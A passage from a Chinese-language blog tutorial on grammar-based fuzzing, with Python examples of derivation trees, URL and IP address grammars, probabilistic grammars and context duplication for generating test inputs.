builtin">len</span><span class="token punctuation">(</span>unreachable<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上列举的是常用的Tools，在Fuzz的编写过程中，要根据实际问题针对性的编写各式各样的工具。</p><h2 id="高效Grammars-Fuzz"><a href="#高效Grammars-Fuzz" class="headerlink" title="高效Grammars Fuzz"></a>高效Grammars Fuzz</h2><p>​  前面提供的simple_grammar_fuzzer其实存在大量的问题，比如性能低下，对于符号的解析次数受限，容易引起报错等，因此需要更加高明的算法。这里选择的是派生树，因为树形结构易于追踪而且易于添加和删除其中分支。关于Fuzz的编写其实就是不断的对派生树进行分析和对子节点的不断扩展。</p><h3 id="派生树算法"><a href="#派生树算法" class="headerlink" title="派生树算法"></a>派生树算法</h3><p>​  从上述的简单算法可以看出，整个的Grammar Fuzz的核心其实就是通过大量的符号扩展形成对应的数据结构，那么用来存储或者拓展符号的数据结构其实尤为重要。派生树的树状结构其实完美的符合了我们的要求，树形结构自上而下的扩展正好和符号的扩展相对应。而且<code>派生树使得我们可以掌控整个扩展过程的状态</code>，比如那些节点已经被扩展，或者某个节点是否需要扩展等，同时，在扩展过程中增加新节点的速度远超把一个符号替换为一个值的过程，因此使用这种数据结构也带来了一定的性能增益。</p><p>​  让我们以下面的Grammar为例子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># URL Grammar</span>URL_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;url&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;url&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;scheme&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"https"</span><span class="token punctuation">,</span> <span class="token string">"ftp"</span><span class="token punctuation">,</span> <span class="token string">"ftps"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;authority&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;host&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;host&gt;:&lt;port&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;userinfo&gt;@&lt;host&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;host&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># 大部分情况下其实可以指定一个URL</span>        <span class="token punctuation">[</span><span class="token string">"cispa.saarland"</span><span class="token punctuation">,</span> <span class="token string">"www.google.com"</span><span class="token punctuation">,</span> <span class="token string">"fuzzingbook.com"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;port&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"80"</span><span class="token punctuation">,</span> <span class="token string">"8080"</span><span class="token punctuation">,</span> <span class="token string">"&lt;nat&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;nat&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;userinfo&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just one</span>        <span class="token punctuation">[</span><span class="token string">"user:password"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;path&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just a few</span>        <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"/&lt;id&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;id&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just a few</span>        <span class="token punctuation">[</span><span class="token string">"abc"</span><span class="token punctuation">,</span> <span class="token string">"def"</span><span class="token punctuation">,</span> <span class="token string">"x&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;query&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"?&lt;params&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;params&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;param&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;param&gt;&amp;&lt;params&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;param&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just a few</span>        <span class="token punctuation">[</span><span class="token string">"&lt;id&gt;=&lt;id&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;id&gt;=&lt;nat&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以派生树算法来看，首先以<code>&lt;start&gt;</code>为初始节点，然后在Grammar中发现其存在对应的表达，所以就会选择<code>&lt;url&gt;</code>作为它的子节点，循环往复知道一个节点不再出现对应的子节点，然后整个的树形结构完成解析，输出对应的结构化数据。</p><p>​  对应的数据表示如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>SYMBOL_NAME<span class="token punctuation">,</span> CHILDREN<span class="token punctuation">)</span>DerivationTree <span class="token operator">=</span> Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Optional<span class="token punctuation">[</span>List<span class="token punctuation">[</span>Any<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>derivation_tree<span class="token punctuation">:</span> DerivationTree <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"&lt;start&gt;"</span><span class="token punctuation">,</span>                   <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"&lt;expr&gt;"</span><span class="token punctuation">,</span>                     <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"&lt;expr&gt;"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                      <span class="token punctuation">(</span><span class="token string">" + "</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                         <span class="token punctuation">(</span><span class="token string">"&lt;term&gt;"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">]</span>                     <span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>SYMBOL_NAME</code>代表的就是符号，CHILDREN代表子节点，表示为具体的数据结构就是：<code>DerivationTree = Tuple[str, Optional[List[Any]]]</code>。其中CHILDREN主要有两种表示：</p><ol><li>None代表当前节点可以继续向下扩展，其含义就是现在节点存在可扩展的符号。</li><li>[]代表的就是没有子节点了</li></ol><p>整个算法都围绕上面的基本原理展开</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">g_rammar_fuzzer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> GrammarFuzzer<span class="token punctuation">(</span>URL_GRAMMAR<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>fuzz<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ProbabilisticGrammarFuzzer"><a href="#ProbabilisticGrammarFuzzer" class="headerlink" title="ProbabilisticGrammarFuzzer"></a>ProbabilisticGrammarFuzzer</h3><p>​  有时候完全随机的进行表达式展开其实会白白浪费大量的时间和资源，因此可以对表达式附加概率值，这一块涉及到大量的概率学问题，有部分数据来源于世界的统计规律，比如下面给出的<code>leaddigit</code>符号对应的概率，这些就不在深入分析。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">PROBABILISTIC_EXPR_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;expr&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;expr&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"&lt;term&gt; + &lt;expr&gt;"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"&lt;term&gt; - &lt;expr&gt;"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token string">"&lt;term&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;term&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"&lt;factor&gt; * &lt;term&gt;"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"&lt;factor&gt; / &lt;term&gt;"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token string">"&lt;factor&gt;"</span>         <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;factor&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"+&lt;factor&gt;"</span><span class="token punctuation">,</span> <span class="token string">"-&lt;factor&gt;"</span><span class="token punctuation">,</span> <span class="token string">"(&lt;expr&gt;)"</span><span class="token punctuation">,</span>            <span class="token string">"&lt;leadinteger&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;leadinteger&gt;.&lt;integer&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;leadinteger&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;leaddigit&gt;&lt;integer&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;leaddigit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment"># Benford's law: frequency distribution of leading digits</span>    <span class="token string">"&lt;leaddigit&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.301</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.176</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.125</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.097</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.079</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"6"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.067</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"7"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.058</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"8"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.051</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">(</span><span class="token string">"9"</span><span class="token punctuation">,</span> opts<span class="token punctuation">(</span>prob<span class="token operator">=</span><span class="token number">0.046</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>         <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment"># Remaining digits are equally distributed</span>    <span class="token string">"&lt;integer&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;digit&gt;&lt;integer&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟之前的Grammar有很大不同的地方在于，现在的Grammar可以通过增加注释的方式为列表中的值添加随机概率，使得作者可以通过逆向获取其它渠道得到的信息可以在Fuzz中获得利用。那现在问题就显而易见了，如何确定概率？</p><p>​  当Fuzz的作者没办法直接给出一个符号对应的所有项具体的概率的时候，可以遵循的最直接的规则就是下面三个公式：</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727074801193.2ln12v05bx40.png"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727074816609.10867094x8k0.png"></p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20220731/image-20220727074824325.1vqo9xj0oiw0.png"></p><p>大致含义也很好理解，就是a代表的是已知概率的项，而u代表的未知概率的项目，已知概率自然可以通过<code>opts</code>的方法给对应项附加概率，未知概率的项则按照概率平分的原则来赋予概率。之后自然是要在Fuzz里面引入概率，使得在生成种子的时候可以对符号解析的选择赋予权重，进而提高Fuzz效率。</p><p>​  就Fuzz的具体实现而言，其实相比于上述的Grammar Fuzz只是增加了一个对于opts注释的访问，以便在随机解析的时候可以附加概率值权重。但是这样带来的优势是很明显的，甚至可以通过控制输入Fuzz目标指定的Func等。但是还有一种情况，我第一次解析Grammar symbol的时候希望它的概率为0.3，但是我第二次解析Grammar symbol的时候希望其概率为0.5，为了实现这一点其实可以利用上下文，在不同的上下文中复制希望赋予其不同概率的symbol，以IP Grammar为例子：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">IP_ADDRESS_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;address&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;address&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment"># ["0", "1", "2", ..., "255"]</span>    <span class="token string">"&lt;octet&gt;"</span><span class="token punctuation">:</span> decrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token comment"># 其实代表的就是0-256</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了使得每次解析<code>&lt;octet&gt;</code>的时候都使用不同的概率，可以对其扩展，形成下面的语法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">IP_ADDRESS_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;address&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;address&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;octet-1&gt;.&lt;octet-2&gt;.&lt;octet-3&gt;.&lt;octet-4&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token comment"># ["0", "1", "2", ..., "255"]</span>    <span class="token string">"&lt;octet-1&gt;"</span><span class="token punctuation">:</span> decrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token comment"># 其实代表的就是0-256</span>    <span class="token string">"&lt;octet-2&gt;"</span><span class="token punctuation">:</span> decrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token comment"># 其实代表的就是0-256</span>    <span class="token string">"&lt;octet-3&gt;"</span><span class="token punctuation">:</span> decrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token comment"># 其实代表的就是0-256</span>    <span class="token string">"&lt;octet-4&gt;"</span><span class="token punctuation">:</span> decrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token comment"># 其实代表的就是0-256</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样在进行解析的时候就完全可以对每次解析附加不同的概率。下面是帮助实现的函数：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_duplicate_context</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                       orig_grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                       symbol<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>                       expansion<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Expansion<span class="token punctuation">]</span><span class="token punctuation">,</span>                       depth<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">float</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                       seen<span class="token punctuation">:</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Helper function for `duplicate_context()`"""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> expansion <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> expansion<span class="token punctuation">:</span>            new_expansion <span class="token operator">=</span> <span class="token string">""</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token keyword">in</span> expansion_to_children<span class="token punctuation">(</span>grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> s <span class="token keyword">in</span> seen<span class="token punctuation">:</span>                 <span class="token comment"># Duplicated already</span>                    new_expansion <span class="token operator">+=</span> seen<span class="token punctuation">[</span>s<span class="token punctuation">]</span>                <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">or</span> depth <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>   <span class="token comment"># Terminal symbol or end of recursion</span>                    new_expansion <span class="token operator">+=</span> s                <span class="token keyword">else</span><span class="token punctuation">:</span>                         <span class="token comment"># Nonterminal symbol - duplicate</span>                    <span class="token comment"># Add new symbol with copy of rule</span>                    new_s <span class="token operator">=</span> new_symbol<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> s<span class="token punctuation">)</span>                    grammar<span class="token punctuation">[</span>new_s<span class="token punctuation">]</span> <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>orig_grammar<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token comment"># Duplicate its expansions recursively</span>                    <span class="token comment"># {**seen, **{s: new_s}} is seen + {s: new_s}</span>                    _duplicate_context<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> orig_grammar<span class="token punctuation">,</span> new_s<span class="token punctuation">,</span> expansion<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span>                                       depth<span class="token operator">=</span>depth <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> seen<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">**</span>seen<span class="token punctuation">,</span> <span class="token operator">**</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span> new_s<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span>                    new_expansion <span class="token operator">+=</span> new_s            grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> new_expansion<span class="token keyword">def</span> <span class="token function">duplicate_context</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                       symbol<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span>                      expansion<span class="token punctuation">:</span> Optional<span class="token punctuation">[</span>Expansion<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>                       depth<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">float</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">'inf'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Duplicate an expansion within a grammar.    In the given grammar, take the given expansion of the given `symbol`    (if `expansion` is omitted: all symbols), and replace it with a    new expansion referring to a duplicate of all originally referenced rules.    If `depth` is given, limit duplication to `depth` references    (default: unlimited)    """</span>    orig_grammar <span class="token operator">=</span> extend_grammar<span class="token punctuation">(</span>grammar<span class="token punctuation">)</span>    _duplicate_context<span class="token punctuation">(</span>grammar<span class="token punctuation">,</span> orig_grammar<span class="token punctuation">,</span> symbol<span class="token punctuation">,</span>                       expansion<span class="token punctuation">,</span> depth<span class="token punctuation">,</span> seen<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token comment"># After duplication, we may have unreachable rules; delete them</span>    <span class="token keyword">for</span> nonterminal <span class="token keyword">in</span> unreachable_nonterminals<span class="token punctuation">(</span>grammar<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> grammar<span class="token punctuation">[</span>nonterminal<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在完成上下文复制之后就可以通过类似下面的操作得到我们想要的结果：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">set_prob<span class="token punctuation">(</span>probabilistic_ip_address_grammar<span class="token punctuation">,</span> <span class="token string">"&lt;octet-1&gt;"</span><span class="token punctuation">,</span> <span class="token string">"127"</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span>set_prob<span class="token punctuation">(</span>probabilistic_ip_address_grammar<span class="token punctuation">,</span> <span class="token string">"&lt;octet-2&gt;"</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过这就又引入一个问题，概率在赋予给symbol之后一成不变真的合适吗？在真实世界的Fuzz中随着我们对于目标的不断了解，或者一些其它情况比如长时间未出现想要的结果等，及时改变策略也是非常必要的，但是如果Fuzz可以智能的自己调节调整不同symbol的概率值的话，会减轻很多的负担并获得更好的软件测试效果。一个比较好的办法是让Fuzz通过最开始被给予Inputs种子来学习应该赋予某些symbol多大的一个概率值，这种方法在某些场景下非常有用：</p><ol><li>测试常用功能，因为很多软件测试更希望常用的功能确保安全，但是对于漏洞挖掘研究人员来说可能目标不在于此。</li><li>测试不常用功能，通过规避Inputs中解析到的symbol，Fuzz就会更偏向于测试一些不常用的功能。</li><li>专注于指定的Inputs，一些漏洞挖掘可能希望专注于已有的非常有价值的poc inputs，通过专注于这些inputs，Fuzz可以测试软件的一些薄弱环节从而达到很好的效果。</li></ol><p>​  理论已经存在，那么如何实现呢？第一步肯定是需要将已经存在的Inputs种子恢复成为派生树，然后对派生树种每个Symbol对应的值有多少来计算将来的概率值。</p><p><img 